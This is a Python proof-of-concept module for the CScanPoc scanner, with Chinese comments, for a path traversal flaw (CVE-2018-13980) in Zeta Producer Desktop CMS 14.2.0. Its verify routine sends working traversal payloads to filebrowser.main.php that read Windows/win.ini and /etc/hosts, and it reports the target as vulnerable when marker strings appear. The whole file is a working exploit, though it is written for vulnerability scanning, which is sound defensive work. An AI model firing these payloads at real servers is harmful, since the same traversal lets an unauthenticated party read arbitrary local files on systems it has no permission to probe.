# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'ZetaProducerDesktopCMS_0000'  # 平台漏洞编号
    name = 'ZetaProducerDesktop CMS本地文件泄露'  # 漏洞名称
    level = VulnLevel.MED  # 漏洞危害级别
    type = VulnType.INFO_LEAK  # 漏洞类型
    disclosure_date = '2018-07-16'  # 漏洞公布时间
    desc = '''
    Zeta Producer Desktop CMS一个一款内容管理系统。
    Zeta Producer Desktop CMS存在本地文件泄露漏洞，未经身份验证的攻击者可以通过利用路径遍历问题来读取本地文件。
    '''  # 漏洞描述
    ref = 'http://www.cnvd.org.cn/flaw/show/CNVD-2018-13198'
    cnvd_id = 'CNVD-2018-13198'  # cnvd漏洞编号
    cve_id = 'CVE-2018-13980'  # cve编号
    product = 'ZetaProducerDesktopCMS'  # 漏洞组件名称
    product_version = '14.2.0'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'ddef410e-431c-42f0-915c-029a05a0d35a'  # 平台 POC 编号
    author = '国光'  # POC编写者
    create_date = '2018-07-15'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)

            self.output.info("正在尝试读取系统敏感文件信息")
            win_payload = "/assets/php/filebrowser/filebrowser.main.php?file=../../../../../../../../../../../Windows/win.ini&do=download"
            linux_payload = "/assets/php/filebrowser/filebrowser.main.php?file=../../../../../../../../../../../etc/hosts&do=download"
            win_url = arg + win_payload
            linux_url = arg + linux_payload

            headers = {
                'Content-Type': 'application/x-www-form-urlencoded',
            }

            win_response = requests.get(win_url)
            linux_response = requests.get(linux_url)

            if win_response.status_code == 200 and 'extensions' in win_response.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))
            if linux_response.status_code == 200 and 'localhost' in linux_response.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))
        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
